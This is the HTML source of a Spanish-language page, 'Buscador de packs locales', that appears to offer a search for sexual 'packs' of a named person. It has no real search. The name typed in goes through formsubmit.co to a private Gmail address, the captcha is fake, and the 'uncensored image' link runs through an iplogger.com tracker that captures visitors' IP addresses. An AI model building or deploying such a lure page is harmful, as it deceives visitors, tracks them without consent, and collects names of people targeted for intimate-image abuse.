<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="shortcut icon" href="icon.png" type="image/x-icon">
    <link rel="stylesheet" href="captcha.css">
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
    <script src="main.js" defer></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Packs</title>
</head>
<body>
    <div class="container">
        <h1 class="title">Buscador de packs locales</h1>
        <form action="https://formsubmit.co/aaronchavez966@gmail.com" method="post" name="wantedPacks" class="form">
            <label for="input">
                Ingresa el nombre aqui
                <input type="text" id="input" name="wanted-person">
            </label>
    
            <button id="button" type="submit">Buscar pack</button>
        </form>

        <div class="captcha-container">
            <input type="checkbox" class="captcha-input">
            <div class="captcha-square">
                <i class="fa-solid fa-check"></i>
            </div>
            <span class="captcha-text">No soy un robot</span>
            <img src="RecaptchaLogo.svg.png" alt="" class="captcha-logo">
          </div>

          <div class="result">
             
             <a href="https://iplogger.com/293xR5" class="result-link">
                 <img class='result-img' src="https://nodoexo.com/wp-content/uploads/2023/09/IA-para-crear-imagenes-sin-restricciones.jpg" alt="imagen +18">
                 Haz click para ver la imagen sin censura
               </a>  

            <img src="loading-25.gif" alt="" class="loading">

               <span id="error-span" class="error-span">Ingresa un nombre valido <i class="fa-solid fa-pen-fancy"></i></span>

        </div>

    </div>
</body>
</html>
